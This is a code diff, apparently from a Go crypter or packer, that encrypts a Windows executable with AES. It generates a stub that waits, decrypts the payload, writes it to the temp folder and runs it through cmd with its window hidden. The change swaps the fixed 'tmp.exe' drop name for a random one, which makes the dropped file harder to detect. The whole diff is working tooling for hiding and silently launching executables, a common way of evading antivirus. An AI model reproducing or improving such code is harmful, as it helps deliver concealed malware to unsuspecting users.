@@ -107,6 +107,16 @@ func GenerateKey(Size int) string {
     return string(bytes)
 }
 
+func GenerateNameFileTmp(Size int) string {
+    characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    var bytes = make([]byte, Size)
+    rand.Read(bytes)
+    for i, x := range bytes {
+        bytes[i] = characters[x%byte(len(characters))]
+    }
+    return string(bytes)
+}
+
 func Encrypt(Key []byte, PlainCode []byte) string {
 	Block, err := aes.NewCipher(Key)
 	if err != nil {
@@ -385,6 +395,7 @@ func GenerateCode(){
 
   Key := GenerateKey(32)
   KeyByte := []byte(Key)
+  FileTmp := GenerateNameFileTmp(8)
 
   PlainCode, err := ioutil.ReadFile(string(NAME) + ".exe")
   if err != nil {
@@ -411,8 +422,8 @@ func GenerateCode(){
   finalCode.WriteString("WaitTimeMenu()\r\n")
   finalCode.WriteString("DecryptCode := Decrypt([]byte(key), code)\r\n")
   finalCode.WriteString("PathTmp := os.TempDir()\r\n")
-  finalCode.WriteString("ioutil.WriteFile(PathTmp + \"\\\\tmp.exe\", []byte(DecryptCode), 777)\r\n")
-  finalCode.WriteString("run := exec.Command(\"cmd\", \"/C\", PathTmp + \"\\\\tmp.exe\");\r\n")
+  finalCode.WriteString("ioutil.WriteFile(PathTmp + \"\\\\" + FileTmp + ".exe\", []byte(DecryptCode), 777)\r\n")
+  finalCode.WriteString("run := exec.Command(\"cmd\", \"/C\", PathTmp + \"\\\\" + FileTmp + ".exe\");\r\n")
   finalCode.WriteString("run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
   finalCode.WriteString("run.Run();\r\n")
   finalCode.WriteString("}\r\n")
